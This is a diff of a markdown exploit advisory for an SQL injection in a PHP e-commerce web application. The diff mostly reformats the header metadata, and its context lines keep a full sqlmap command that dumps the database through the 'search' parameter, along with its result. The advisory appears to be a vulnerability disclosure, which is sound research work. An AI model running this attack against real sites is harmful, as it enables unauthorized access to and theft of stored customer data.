@@ -1,12 +1,12 @@
 # E-Commerce Website - SQL Injection 1
-+ Exploit Title: E-Commerce Website - SQL Injection 1
-+ Date: 2023-24-12
-+ Exploit Author: Hamdi Sevben
-+ Vendor Homepage: https://code-projects.org/e-commerce-website-in-php-with-source-code/
-+ Software Link: https://download-media.code-projects.org/2020/01/E-COMMERCE_WEBSITE_IN_PHP_WITH_SOURCE_CODE.zip
-+ Version: 1.0
-+ Tested on: Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
-+ CVE: CVE-
++ **Exploit Title:** E-Commerce Website - SQL Injection 1
++ **Date:** 2023-24-12
++ **Exploit Author:** Hamdi Sevben
++ **Vendor Homepage:** https://code-projects.org/e-commerce-website-in-php-with-source-code/
++ **Software Link:** https://download-media.code-projects.org/2020/01/E-COMMERCE_WEBSITE_IN_PHP_WITH_SOURCE_CODE.zip
++ **Version:** 1.0
++ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
++ **CVE:** CVE-
 
 ## References:
 
@@ -36,7 +36,6 @@ username=admin&login=&password=Pass
 ```
 
 + Use sqlmap to exploit. In sqlmap, use 'search' parameter to dump the database. 
-
 ```
 python sqlmap.py -r r.txt -p search --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
 ```
@@ -68,5 +67,4 @@ current database: 'electricks'
 ```
 
 + current database: `electricks`
-
 ![1](https://github.com/h4md153v63n/CVEs/assets/5091265/e2d64c21-ad38-4af7-977c-d140d0642a28)
